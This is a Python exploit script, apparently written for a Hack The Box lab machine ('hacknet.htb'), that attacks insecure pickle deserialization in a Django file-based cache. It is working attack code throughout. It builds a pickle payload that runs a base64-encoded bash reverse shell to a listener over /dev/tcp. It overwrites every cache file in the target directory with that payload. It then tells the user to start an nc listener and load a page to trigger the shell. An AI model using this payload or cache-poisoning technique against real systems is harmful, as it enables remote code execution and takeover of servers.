#!/usr/bin/env python3
"""
Django Cache Pickle Deserialization RCE
Exploits insecure pickle deserialization in Django file-based cache
"""

import pickle
import base64
import os
import sys

# ============================================
# CONFIGURATION - Modify for your target
# ============================================
CACHE_DIR = "/var/tmp/django_cache"
LHOST = "10.10.15.180"  # Change to your VPN IP
LPORT = "4444"           # Change to your listener port

# ============================================
# Generate Reverse Shell Command
# ============================================
# Bash reverse shell: (bash >& /dev/tcp/IP/PORT 0>&1) &
reverse_shell = f"(bash >& /dev/tcp/{LHOST}/{LPORT} 0>&1) &"
encoded_shell = base64.b64encode(reverse_shell.encode()).decode()
cmd = f"printf {encoded_shell}|base64 -d|bash"

print(f"[*] Target cache directory: {CACHE_DIR}")
print(f"[*] Reverse shell command: {reverse_shell}")
print(f"[*] Listener: {LHOST}:{LPORT}")
print()

# ============================================
# Create Pickle Payload for RCE
# ============================================
class RCE:
    """Pickle payload that executes system command on deserialization"""
    def __reduce__(self):
        return (os.system, (cmd,))

payload = pickle.dumps(RCE())

print(f"[+] Generated pickle payload ({len(payload)} bytes)")
print()

# ============================================
# Write Payload to Cache Files
# ============================================
if not os.path.exists(CACHE_DIR):
    print(f"[-] Cache directory does not exist: {CACHE_DIR}")
    sys.exit(1)

cache_files = [f for f in os.listdir(CACHE_DIR) if f.endswith(".djcache")]

if not cache_files:
    print(f"[!] No .djcache files found in {CACHE_DIR}")
    print(f"[*] You may need to visit /explore first to generate cache files")
    sys.exit(1)

print(f"[*] Found {len(cache_files)} cache file(s)")

success_count = 0
for filename in cache_files:
    path = os.path.join(CACHE_DIR, filename)
    try:
        # Remove original file
        os.remove(path)
        
        # Write pickle payload
        with open(path, "wb") as f:
            f.write(payload)
        
        print(f"[+] Written payload to {filename}")
        success_count += 1
    except Exception as e:
        print(f"[-] Failed to write {filename}: {e}")

print()
print(f"[+] Successfully poisoned {success_count}/{len(cache_files)} cache files")
print()
print("[!] NEXT STEPS:")
print("    1. Start netcat listener: nc -lvnp 4444")
print("    2. Visit http://hacknet.htb/explore to trigger RCE")
print("    3. You should get a reverse shell as www-data")
print()

